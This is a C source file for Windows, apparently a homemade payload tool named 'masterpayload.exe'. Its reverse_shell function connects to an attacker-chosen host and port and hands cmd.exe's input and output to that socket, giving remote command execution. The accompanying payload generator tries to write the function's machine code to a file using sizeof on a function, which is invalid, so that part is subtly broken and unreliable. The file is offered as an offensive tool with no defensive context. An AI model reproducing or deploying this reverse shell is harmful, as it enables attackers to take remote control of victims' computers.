#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library

void reverse_shell(const char* lhost, const int lport) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char *cmd = "cmd.exe";

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(lport);
    server.sin_addr.s_addr = inet_addr(lhost);  // Convert LHOST IP to network byte order

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed\n");
        return;
    }

    // Initialize the STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    // Create a new process to run cmd.exe
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();  // Clean up Winsock
}

void usage() {
    printf("Usage: masterpayload.exe LHOST=(IP) LPORT=(port) --write (can use -w) name.exe\n");
}

void generate_payload(const char *lhost, const char *lport, const char *output_file) {
    FILE *f = fopen(output_file, "wb");

    if (!f) {
        perror("Error opening output file");
        return;
    }

    // Print out the LHOST and LPORT in the generated file
    fprintf(f, "Generated reverse shell payload\n");
    fprintf(f, "LHOST: %s\nLPORT: %s\n", lhost, lport);

    // Write the reverse shell code into the file
    fwrite(reverse_shell, sizeof(reverse_shell), 1, f);

    fclose(f);
    printf("[*] Payload generován! s LHOSTEM %s a LPORTEM %s !\n", lhost, lport);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
        return 1;
    }

    // Variables to hold LHOST, LPORT, and output filename
    char lhost[256] = {0};
    char lport[256] = {0};
    char output_file[256] = {0};

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "LHOST=", 6) == 0) {
            strncpy(lhost, argv[i] + 6, sizeof(lhost) - 1);
        } else if (strncmp(argv[i], "LPORT=", 6) == 0) {
            strncpy(lport, argv[i] + 6, sizeof(lport) - 1);
        } else if (strncmp(argv[i], "--write", 7) == 0 || strncmp(argv[i], "-w", 2) == 0) {
            if (i + 1 < argc) {
                strncpy(output_file, argv[i + 1], sizeof(output_file) - 1);
                i++; // Skip next argument as it's the output filename
            }
        }
    }

    // Check if all required fields are present
    if (strlen(lhost) == 0 || strlen(lport) == 0 || strlen(output_file) == 0) {
        usage();
        return 1;
    }

    // Generate the payload
    generate_payload(lhost, lport, output_file);
    return 0;
}
